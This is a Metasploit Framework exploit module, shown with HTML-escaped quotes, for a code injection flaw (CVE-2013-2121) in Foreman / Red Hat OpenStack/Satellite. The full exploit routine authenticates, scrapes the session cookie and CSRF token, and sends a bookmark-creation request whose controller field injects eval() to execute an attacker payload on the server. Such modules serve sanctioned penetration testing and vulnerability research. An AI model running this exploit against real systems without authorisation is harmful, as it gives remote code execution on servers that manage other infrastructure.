# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      &#039;Name&#039;           => &#039;Foreman (Red Hat OpenStack/Satellite) bookmarks/create Code Injection&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a code injection vulnerability in the &#039;create&#039;
        action of &#039;bookmarks&#039; controller of Foreman and Red Hat OpenStack/Satellite
        (Foreman 1.2.0-RC1 and earlier).
      },
      &#039;Author&#039;         => &#039;Ramon de C Valle&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2121&#039;],
          [&#039;CWE&#039;, &#039;95&#039;],
          [&#039;OSVDB&#039;, &#039;94671&#039;],
          [&#039;BID&#039;, &#039;60833&#039;],
          [&#039;URL&#039;, &#039;https://bugzilla.redhat.com/show_bug.cgi?id=968166&#039;],
          [&#039;URL&#039;, &#039;http://projects.theforeman.org/issues/2631&#039;]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 6 2013&#039;,
      &#039;DefaultOptions&#039; => { &#039;PrependFork&#039; => true },
      &#039;DefaultTarget&#039; => 0
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Your username&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Your password&#039;, &#039;changeme&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the application&#039;, &#039;/&#039;]),
      ], self.class
    )
  end

  def exploit
    print_status("Logging into #{target_url}...")
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;users&#039;, &#039;login&#039;),
      &#039;vars_post&#039; => {
        &#039;login[login]&#039;    => datastore[&#039;USERNAME&#039;],
        &#039;login[password]&#039; => datastore[&#039;PASSWORD&#039;]
      }
    )

    fail_with(Exploit::Failure::Unknown, &#039;No response from remote host&#039;) if res.nil?

    if res.headers[&#039;Location&#039;] =~ /users\/login$/
      fail_with(Exploit::Failure::NoAccess, &#039;Authentication failed&#039;)
    else
      session = $1 if res.headers[&#039;Set-Cookie&#039;] =~ /_session_id=([0-9a-f]*)/
      fail_with(Exploit::Failure::UnexpectedReply, &#039;Failed to retrieve the current session id&#039;) if session.nil?
    end

    print_status(&#039;Retrieving the CSRF token for this session...&#039;)
    res = send_request_cgi(
      &#039;cookie&#039; => "_session_id=#{session}",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri)
    )

    fail_with(Exploit::Failure::Unknown, &#039;No response from remote host&#039;) if res.nil?

    if res.headers[&#039;Location&#039;] =~ /users\/login$/
      fail_with(Exploit::Failure::UnexpectedReply, &#039;Failed to retrieve the CSRF token&#039;)
    else
      csrf_param = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
      csrf_token = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i

      if csrf_param.nil? || csrf_token.nil?
        csrf_param = $1 if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
        csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
      end

      fail_with(Exploit::Failure::UnexpectedReply, &#039;Failed to retrieve the CSRF token&#039;) if csrf_param.nil? || csrf_token.nil?
    end

    payload_param = Rex::Text.rand_text_alpha_lower(rand(9) + 3)

    print_status("Sending create-bookmark request to #{target_url(&#039;bookmarks&#039;)}...")
    res = send_request_cgi(
      &#039;cookie&#039;    => "_session_id=#{session}",
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;bookmarks&#039;),
      &#039;vars_post&#039; => {
        csrf_param             => csrf_token,
        payload_param          => payload.encoded,
        &#039;bookmark[controller]&#039; => "eval(params[:#{payload_param}])#",
        &#039;bookmark[name]&#039;       => Rex::Text.rand_text_alpha_lower(rand(9) + 3),
        &#039;bookmark[query]&#039;      => Rex::Text.rand_text_alpha_lower(rand(9) + 3)
      }
    )
  end

  def target_url(*args)
    (ssl ? &#039;https&#039; : &#039;http&#039;) +
      if rport.to_i == 80 || rport.to_i == 443
        "://#{vhost}"
      else
        "://#{vhost}:#{rport}"
      end + normalize_uri(target_uri.path, *args)
  end
end

